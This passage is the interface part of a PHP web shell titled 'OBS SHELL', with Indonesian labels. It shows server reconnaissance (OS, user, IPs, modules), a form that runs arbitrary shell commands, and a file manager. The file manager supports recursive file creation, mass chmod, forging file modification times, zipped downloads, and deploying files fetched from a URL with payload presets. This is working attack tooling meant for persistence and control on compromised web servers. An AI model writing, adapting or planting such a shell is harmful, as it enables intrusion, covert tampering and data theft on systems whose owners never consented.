   background:url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7yPUK7TB7pjkbgQYoQRdjs_tH_RaD9m8-AggSBri3XX0jSsQv0OEFp2RyhHiaH5L7fjloe65dcFPeav8WYUMdeWJSgsC3pfwZWiHBKv84fO5zxDqdHQAE-u9S3k9-z6bCsPqEtqj5wlGFh8KWrxgPeRbyV4Kn5Hr2dnjvAJMFIZb9qwNc6EGteJwyJZQ/s3840/cd168f8d08bae2ac44c95096be174b46.0000000.jpg') no-repeat center center fixed;
   background-size:cover;
   color:var(--text);
   cursor:default;
   position:relative;
   min-height:100vh;
 }
 body::before{
   content:'';
   position:fixed;
   inset:0;
   background:linear-gradient(135deg, rgba(10,2,25,0.9) 0%, rgba(35,10,65,0.88) 100%);
   z-index:-1;
   pointer-events:none;
 }
 .box {
   border-radius:12px;
   border:1px solid var(--border2);
   padding:12px 14px;
   margin-bottom:12px;
   background:rgba(21,8,38,0.88);
   backdrop-filter:blur(10px);
   -webkit-backdrop-filter:blur(10px);
   box-shadow:0 10px 30px rgba(168,85,247,0.15);
   position:relative;
   z-index:1;
 }
 .box strong { font-size:12px; text-transform:uppercase; letter-spacing:0.08em; color:var(--accent2); }
 input[type=text],input[type=file],textarea{
   font-family:inherit;font-size:13px;border-radius:6px;
   border:1px solid rgba(168,85,247,0.4);
   background:var(--input-bg);color:var(--text);padding:7px 9px;width:100%;
   outline:none;
   transition:border-color .2s, box-shadow .2s;
 }
 input[type=text]:focus, textarea:focus {
   border-color:var(--accent);
   box-shadow:0 0 12px rgba(168,85,247,0.5);
 }
 textarea{
   height:320px;resize:vertical;line-height:1.4;
   font-family:"JetBrains Mono",monospace;font-size:12px;
 }
 button{
   border-radius:999px;border:1px solid rgba(168,85,247,0.5);
   background:rgba(168,85,247,0.15);
   color:var(--accent2);font-size:11px;padding:5px 12px;cursor:pointer;
   font-weight:600;
   letter-spacing:0.5px;
   transition:all .15s;
 }
 button:hover{
   border-color:var(--accent);
   background:rgba(168,85,247,0.3);
   color:#fff;
   box-shadow:0 0 15px rgba(168,85,247,0.5);
 }
 .btn-danger{
   border-color:rgba(255,77,106,0.6);
   background:rgba(255,77,106,0.15);
   color:#ff4d4d;
 }
 .btn-danger:hover{
   border-color:var(--danger);
   background:rgba(255,77,106,0.3);
   color:#fff;
   box-shadow:0 0 15px rgba(255,77,106,0.5);
 }
 table{
   border-collapse:collapse;width:100%;font-size:12px;margin-top:4px;table-layout:fixed;
 }
 th,td{
   border:1px solid var(--border);
   padding:6px 8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
 }
 th{
   background:rgba(30,8,60,0.92);color:var(--accent2);font-size:11px;
   text-transform:uppercase;letter-spacing:0.06em;
   border-bottom:2px solid var(--border2);
 }
 tbody tr{ background:rgba(15,5,35,0.6); transition:background .15s; }
 tbody tr:hover{ background:var(--row-hover); }
 tbody tr.selected-row{
   background:var(--row-selected);
   box-shadow:inset 0 0 0 1px var(--accent-soft);
 }
 .header{
   display:flex;align-items:center;gap:12px;margin-bottom:14px;
   padding:10px 14px;
   background:rgba(21,8,38,0.88);
   backdrop-filter:blur(10px);
   -webkit-backdrop-filter:blur(10px);
   border-radius:12px;
   border:1px solid var(--border2);
   box-shadow:0 10px 30px rgba(168,85,247,0.15);
 }
 .header-logo {
   width:52px;
   height:52px;
   object-fit:contain;
   filter:drop-shadow(0 0 10px #a855f7) drop-shadow(0 0 20px #7c3aed);
   animation:floatLogo 3s ease-in-out infinite;
 }
 @keyframes floatLogo {
   0%,100% { transform:translateY(0); }
   50%     { transform:translateY(-4px); }
 }
 .title-text{
   font-size:15px;
   letter-spacing:0.15em;
   text-transform:uppercase;
   color:var(--accent2);
   font-weight:700;
   text-shadow:0 0 10px #a855f7;
 }
 .term-output{
   margin-top:10px;padding:10px;border-radius:8px;
   border:1px solid var(--border2);
   background:rgba(10,2,25,0.95);
   font-family:"JetBrains Mono",monospace;font-size:11px;
   max-height:260px;overflow:auto;white-space:pre-wrap;
   color:#d8b4fe;
   box-shadow:inset 0 0 20px rgba(168,85,247,0.08);
 }
 a{color:var(--accent2);text-decoration:none;transition:color .15s;}
 a:hover{color:#e9d5ff;text-shadow:0 0 8px rgba(168,85,247,0.6);}
 ::-webkit-scrollbar { width:8px; height:8px; }
 ::-webkit-scrollbar-track { background:rgba(21,8,38,0.6); }
 ::-webkit-scrollbar-thumb { background:#4c1d95; border-radius:4px; }
 ::-webkit-scrollbar-thumb:hover { background:#a855f7; }
 .info-panel {
   font-size:12px; line-height:1.5; margin-bottom:12px; padding:12px 14px;
   background:rgba(21,8,38,0.88);
   backdrop-filter:blur(10px);
   -webkit-backdrop-filter:blur(10px);
   border-radius:12px; border:1px solid var(--border2);
   box-shadow:0 10px 30px rgba(168,85,247,0.15);
 }
 .info-panel strong { color:var(--accent2); }

 /* ===== BADGE TIPE ===== */
 .badge {
   display: inline-block;
   font-size: 10px;
   font-weight: 700;
   letter-spacing: 1px;
   padding: 2px 8px;
   border-radius: 4px;
   text-transform: uppercase;
 }
 .badge-dir {
   background: rgba(216,180,254,0.2);
   color: #d8b4fe;
   border: 1px solid rgba(216,180,254,0.5);
 }
 .badge-file {
   background: rgba(192,132,252,0.15);
   color: #c084fc;
   border: 1px solid rgba(192,132,252,0.4);
 }

 /* ===== FOLDER LINK ===== */
 .folder-link {
   color: #d8b4fe !important;
   font-weight: 600;
 }
 .folder-link:hover {
   color: #e9d5ff !important;
   text-shadow: 0 0 10px rgba(168,85,247,0.8);
 }
 .edit-link {
   color: #c084fc !important;
   font-weight: 600;
 }
 .edit-link:hover {
   color: #e9d5ff !important;
 }

 /* ===== BREADCRUMB PATH ===== */
 .breadcrumb {
   display: flex;
   flex-wrap: wrap;
   align-items: center;
   gap: 6px;
   padding: 10px 12px;
   background: rgba(15,5,35,0.8);
   border: 1px solid var(--border2);
   border-radius: 8px;
   font-family: "JetBrains Mono", monospace;
   font-size: 12px;
   line-height: 1.8;
 }
 .crumb {
   display: inline-block;
   padding: 3px 10px;
   border-radius: 5px;
   background: rgba(168,85,247,0.12);
   color: #c084fc;
   border: 1px solid rgba(168,85,247,0.3);
   text-decoration: none;
   transition: all .15s;
   font-weight: 600;
 }
 .crumb:hover {
   background: rgba(168,85,247,0.3);
   color: #fff;
   box-shadow: 0 0 12px rgba(168,85,247,0.5);
   text-decoration: none;
 }
 .crumb-sep {
   color: #a855f7;
   font-weight: 700;
   font-size: 14px;
   opacity: 0.7;
 }
 .crumb-active {
   background: linear-gradient(45deg, #a855f7, #7c3aed);
   color: #fff !important;
   border-color: #a855f7;
   box-shadow: 0 0 15px rgba(168,85,247,0.6);
   text-shadow: 0 0 6px rgba(255,255,255,0.5);
   pointer-events: none;
 }
 .up-btn {
   display: inline-block;
   padding: 5px 14px;
   border-radius: 6px;
   background: rgba(168,85,247,0.15);
   border: 1px solid rgba(168,85,247,0.4);
   color: #c084fc;
   font-weight: 600;
   transition: all .15s;
 }
 .up-btn:hover {
   background: rgba(168,85,247,0.3);
   color: #fff;
   box-shadow: 0 0 12px rgba(168,85,247,0.5);
   text-decoration: none;
 }
</style>
<script>
function setPreset(url){
  const el=document.getElementById('src_url');
  if(!el)return;
  el.value=url;
}
function toggleAllCheckboxes(source){
  document.querySelectorAll('input[type="checkbox"][name="file_targets[]"], input[type="checkbox"][name="dir_targets[]"]').forEach(cb=>{
    cb.checked = source.checked;
  });
}
function toggleBox(id){
  const all=['box_new_file','box_new_folder','box_rename','box_chmod','box_time','box_url_upload'];
  all.forEach(x=>{
    const el=document.getElementById(x);
    if(!el)return;
    if(x===id){
      el.style.display=(el.style.display==='none'||el.style.display==='')?'block':'none';
    }else{
      el.style.display='none';
    }
  });
}
document.addEventListener('DOMContentLoaded',()=>{
  document.querySelectorAll('tbody tr').forEach(row=>{
    row.addEventListener('click',e=>{
      const tag=e.target.tagName.toLowerCase();
      if(tag==='button'||tag==='input'||tag==='a'||e.target.closest('button')||e.target.closest('a')) return;
      document.querySelectorAll('tbody tr.selected-row').forEach(r=>r.classList.remove('selected-row'));
      row.classList.add('selected-row');
    });
  });
});
</script>
</head>
<body>

<div class="header">
  <img src="https://s15.gifyu.com/images/bQ0b1.png" alt="LOGO" class="header-logo">
  <div class="title-text">OBS SHELL</div>
</div>

<!-- INFO SERVER -->
<div class="info-panel">
  <div><strong>Uname:</strong><br><?php echo htmlspecialchars($uname, ENT_QUOTES, 'UTF-8'); ?></div>
  <div style="margin-top:6px;"><strong>User:</strong><br>
    <?php echo htmlspecialchars($userName, ENT_QUOTES, 'UTF-8'); ?>
    [ <?php echo htmlspecialchars($groupName, ENT_QUOTES, 'UTF-8'); ?> ]
  </div>
  <div style="margin-top:6px;"><strong>PHP:</strong><br>
    <?php echo htmlspecialchars($phpVersion, ENT_QUOTES, 'UTF-8'); ?> Safe Mode: OFF
  </div>
  <div style="margin-top:6px;"><strong>ServerIP:</strong><br>
    <?php echo htmlspecialchars($serverIp, ENT_QUOTES, 'UTF-8'); ?> Your IP: <?php echo htmlspecialchars($yourIp, ENT_QUOTES, 'UTF-8'); ?>
  </div>
  <div style="margin-top:6px;"><strong>DateTime:</strong><br>
    <?php echo htmlspecialchars($dateTime, ENT_QUOTES, 'UTF-8'); ?>
  </div>
  <div style="margin-top:6px;"><strong>HDD:</strong><br>
    Total:<?php echo $diskTotalGB; ?> GB&nbsp;&nbsp;Free:<?php echo $diskFreeGB; ?> GB [<?php echo $diskFreePct; ?>%]
  </div>
  <div style="margin-top:6px;"><strong>SoftWare:</strong><br>
    <?php echo htmlspecialchars($software, ENT_QUOTES, 'UTF-8'); ?>
  </div>
  <div style="margin-top:6px;"><strong>Modules:</strong><br>
    CURL : <?php echo $curlOn; ?> | SSH2 : <?php echo $ssh2On; ?> | MySQL : <?php echo $mysqlOn; ?> | PostgreSQL : <?php echo $pgOn; ?>
  </div>
</div>

<?php if (!empty($messages)): ?>
<div class="box">
  <?php foreach ($messages as $m): ?>
    <div><?php echo htmlspecialchars($m, ENT_QUOTES, 'UTF-8'); ?></div>
  <?php endforeach; ?>
</div>
<?php endif; ?>

<!-- TERMINAL -->
<form method="post" action="<?php echo $self . '?pwd=' . urlencode($pwd); ?>">
  <div class="box">
    <strong>Terminal (cd ke PWD):</strong><br><br>
    <input type="text" name="terminal_cmd" placeholder="contoh: ls -la atau whoami"><br><br>
    <button type="submit" name="action" value="terminal_exec">RUN COMMAND</button>
    <?php if ($terminalOut !== ''): ?>
      <div class="term-output">
        <?php echo htmlspecialchars($terminalOut, ENT_QUOTES, 'UTF-8'); ?>
      </div>
    <?php endif; ?>
  </div>
</form>

<!-- FORM UTAMA -->
<form method="post" enctype="multipart/form-data" action="<?php echo $self . '?pwd=' . urlencode($pwd); ?>">

  <!-- BREADCRUMB PATH -->
  <div class="box">
    <strong>PATH:</strong><br>
    <div class="breadcrumb">
      <?php
        $parts = explode('/', trim($pwd, '/'));
        $build = '';
        echo '<a href="' . $self . '?pwd=/' . '" class="crumb">/</a>';
        foreach ($parts as $i => $seg) {
            if ($seg === '') continue;
            $build .= '/' . $seg;
            $isLast = ($i === count($parts) - 1);
            echo '<span class="crumb-sep">›</span>';
            if ($isLast) {
                echo '<span class="crumb crumb-active">' . htmlspecialchars($seg, ENT_QUOTES, 'UTF-8') . '</span>';
            } else {
                echo '<a href="' . $self . '?pwd=' . urlencode($build) . '" class="crumb">' . htmlspecialchars($seg, ENT_QUOTES, 'UTF-8') . '</a>';
            }
        }
      ?>
    </div>
    <div style="margin-top:10px;">
      <input type="text" value="<?php echo htmlspecialchars($pwd, ENT_QUOTES, 'UTF-8'); ?>" readonly>
    </div>
    <?php if ($parent !== $pwd): ?>
      <br><a href="<?php echo $self; ?>?pwd=<?php echo urlencode($parent); ?>" class="up-btn">⬆ Naik satu level</a>
    <?php endif; ?>
  </div>

  <!-- PANEL AKSI -->
  <div class="box">
    <strong>Aksi mass:</strong><br><br>
    <button type="button" onclick="toggleBox('box_new_file')">NEW FILE</button>
    <button type="button" onclick="toggleBox('box_new_folder')">NEW FOLDER</button>
    <button type="button" onclick="toggleBox('box_rename')">RENAME</button>
    <button type="button" onclick="toggleBox('box_chmod')">CHMOD</button>
    <button type="button" onclick="toggleBox('box_time')">MODIFY WAKTU</button>
    <button type="button" onclick="toggleBox('box_url_upload')">URL / UPLOAD</button>
    <button type="submit" name="action" value="download_selected">
      DOWNLOAD SELECTED (ZIP)
    </button>
  </div>

  <div id="box_new_file" class="box" style="display:none;">
    <strong>Create new file (ke PWD / folder dicentang):</strong><br><br>
    <input type="text" name="new_file_name" placeholder="contoh: newfile.php"><br><br>
    <textarea name="new_file_content" placeholder="// isi file baru..."></textarea><br><br>
    <button type="submit" name="action" value="create_file_flat">
      CREATE FILE (hanya PWD / folder dicentang)
    </button>
    <button type="submit" name="action" value="create_file_recursive">
      CREATE FILE RECURSIVE (folder dicentang + isi)
    </button>
  </div>

  <div id="box_new_folder" class="box" style="display:none;">
    <strong>Create new folder (ke PWD / folder dicentang):</strong><br><br>
    <input type="text" name="new_folder_name" placeholder="contoh: newfolder"><br><br>
    <button type="submit" name="action" value="create_folder_flat">
      CREATE FOLDER (hanya PWD / folder dicentang)
    </button>
    <button type="submit" name="action" value="create_folder_recursive">
      CREATE FOLDER RECURSIVE (folder dicentang + isi)
    </button>
  </div>

  <div id="box_rename" class="box" style="display:none;">
    <strong>Rename file (pakai kolom RENAME di tabel):</strong><br><br>
    <span style="font-size:11px;color:#a78bfa;">
      Centang file, ubah nama di kolom RENAME, lalu klik tombol di bawah.
    </span><br><br>
    <button type="submit" name="action" value="rename_save_mass">
      SAVE RENAME (file yang dicentang)
    </button>
  </div>

  <div id="box_chmod" class="box" style="display:none;">
    <strong>CHMOD (file + dir):</strong><br>
    <input type="text" name="chmod_mode" placeholder="misal: 0777 atau 0644"><br><br>
    <button type="submit" name="action" value="chmod_apply_flat">
      APPLY CHMOD (hanya yang dicentang)
    </button>
    <button type="submit" name="action" value="chmod_apply_recursive">
      APPLY CHMOD RECURSIVE (yang dicentang + isi)
    </button>
  </div>

  <div id="box_time" class="box" style="display:none;">
    <strong>Modify waktu (mtime):</strong><br>
    <input type="text" name="time_value" placeholder="YYYY-MM-DD HH:MM:SS"><br><br>
    <button type="submit" name="action" value="time_apply_flat">
      APPLY WAKTU (hanya yang dicentang)
    </button>
    <button type="submit" name="action" value="time_apply_recursive">
      APPLY WAKTU RECURSIVE (yang dicentang + isi)
    </button>
  </div>

  <div id="box_url_upload" class="box" style="display:none;">
    <strong>Preset / URL / Upload (PWD / folder dicentang):</strong><br><br>
    <?php foreach ($presets as $key => $url): ?>
      <button type="button" onclick="setPreset('<?php echo htmlspecialchars($url, ENT_QUOTES, 'UTF-8'); ?>')">
        Preset <?php echo htmlspecialchars($key, ENT_QUOTES, 'UTF-8'); ?>
      </button>
    <?php endforeach; ?><br><br>
    <input type="text" id="src_url" name="src_url" placeholder="https://example.com/file.php"><br><br>
    <input type="text" name="target_name_url" placeholder="nama file tujuan, misal: file.php"><br><br>
    <button type="submit" name="action" value="deploy_url">SAVE DARI URL (PWD / dir dicentang)</button>
    <hr style="border:0;border-top:1px solid #2d1050;margin:10px 0;">
    <input type="file" name="src_file"><br><br>
    <input type="text" name="target_name_upload" placeholder="nama file tujuan upload, misal: upload.php"><br><br>
    <button type="submit" name="action" value="deploy_upload">UPLOAD FILE (PWD / dir dicentang)</button>
  </div>

  <!-- TABEL ISI PWD -->
  <div class="box">
    <strong>Isi PWD:</strong><br><br>
    <?php
      $items = @scandir($pwd);
      if ($items === false) {
          echo '<em>Tidak bisa membaca direktori.</em>';
      } else {
          $folders = [];
          $files   = [];
          foreach ($items as $it) {
              if ($it === '.' || $it === '..') continue;
              $full = $pwd . DIRECTORY_SEPARATOR . $it;
              if (is_dir($full)) $folders[] = $it;
              else $files[] = $it;
          }
          sort($folders);
          sort($files);

          echo '<table>';
          echo '<thead><tr>
                  <th style="width:40px;"><input type="checkbox" onclick="toggleAllCheckboxes(this)"></th>
                  <th style="width:60px;">TIPE</th>
                  <th>NAMA FILE / DIR</th>
                  <th style="width:80px;">EDIT</th>
                  <th style="width:180px;">RENAME (isi nama baru)</th>
                  <th style="width:180px;">ACTION</th>
                  <th style="width:70px;">PERM</th>
                  <th style="width:150px;">MTIME</th>
                </tr></thead><tbody>';

          // ==== FOLDER DULU ====
          foreach ($folders as $it) {
              $full    = $pwd . DIRECTORY_SEPARATOR . $it;
              $safe    = htmlspecialchars($it, ENT_QUOTES, 'UTF-8');
              $perm    = substr(sprintf('%o', @fileperms($full)), -4);
              $mtime   = @filemtime($full);
              $mtimeStr = $mtime ? date('Y-m-d H:i:s', $mtime) : '-';
              $link    = $self . '?pwd=' . urlencode($full);
              $fullEsc = htmlspecialchars($full, ENT_QUOTES, 'UTF-8');

              echo '<tr class="folder-row">';
              echo '<td><input type="checkbox" name="dir_targets[]" value="'.$fullEsc.'" data-type="dir"></td>';
              echo '<td><span class="badge badge-dir">DIR</span></td>';
              echo '<td><a href="'.$link.'" class="folder-link">📁 '.$safe.'/</a></td>';
              echo '<td></td>';
              echo '<td><input type="text" name="rename_dir_val['.$safe.']" value="'.$safe.'"></td>';
              echo '<td>
                      <button type="submit"
                              name="action"
                              value="rename_dir_one:'.$fullEsc.'"
                              onclick="var inp=this.closest(\'tr\').querySelector(\'input[name=&quot;rename_dir_val['.$safe.']&quot;]\'); this.value = \'rename_dir_one:'.$fullEsc.'|\' + (inp?inp.value:\'\');">
                        RENAME
                      </button>
                      <button type="submit" class="btn-danger"
                              name="action"
                              value="delete_dir_one:'.$fullEsc.'"
                              onclick="return confirm(\'Hapus folder '.$safe.' beserta isinya?\')">
                        DELETE
                      </button>
                    </td>';
              echo '<td>'.htmlspecialchars($perm, ENT_QUOTES, 'UTF-8').'</td>';
              echo '<td>'.$mtimeStr.'</td>';
              echo '</tr>';
          }

          // ==== FILE SETELAHNYA ====
          foreach ($files as $it) {
              $full    = $pwd . DIRECTORY_SEPARATOR . $it;
              $safe    = htmlspecialchars($it, ENT_QUOTES, 'UTF-8');
              $perm    = substr(sprintf('%o', @fileperms($full)), -4);
              $mtime   = @filemtime($full);
              $mtimeStr = $mtime ? date('Y-m-d H:i:s', $mtime) : '-';
              $editLink = $self . '?pwd=' . urlencode($pwd) . '&edit=' . urlencode($it);

              echo '<tr>';
              echo '<td><input type="checkbox" class="file-check" name="file_targets[]" value="'.$safe.'" data-type="file"></td>';
              echo '<td><span class="badge badge-file">FILE</span></td>';
              echo '<td>'.$safe.'</td>';
              echo '<td><a href="'.$editLink.'" class="edit-link">EDIT</a></td>';
              echo '<td><input type="text" name="rename_val['.$safe.']" value="'.$safe.'"></td>';
              echo '<td>
                      <button type="submit" class="btn-danger"
                              name="action"
                              value="delete_one:'.$safe.'"
                              onclick="return confirm(\'Hapus '.$safe.'?\')">
                        DELETE
                      </button>
                    </td>';
              echo '<td>'.htmlspecialchars($perm, ENT_QUOTES, 'UTF-8').'</td>';
              echo '<td>'.$mtimeStr.'</td>';
              echo '</tr>';
          }

          echo '</tbody></table>';
      }
    ?>
  </div>

</form>

<?php if ($editFile !== ''): ?>
<form method="post" action="<?php echo $self . '?pwd=' . urlencode($pwd); ?>">
  <div class="box">
    <strong>Edit file:</strong><br><br>
    <input type="text" name="edit_file" value="<?php echo htmlspecialchars($editFile, ENT_QUOTES, 'UTF-8'); ?>" readonly><br><br>
    <textarea name="file_content"><?php echo htmlspecialchars($editContent, ENT_QUOTES, 'UTF-8'); ?></textarea><br><br>
    <button type="submit" name="action" value="edit_save">SAVE FILE</button>
  </div>
</form>
<?php endif; ?>

</body>
</html>
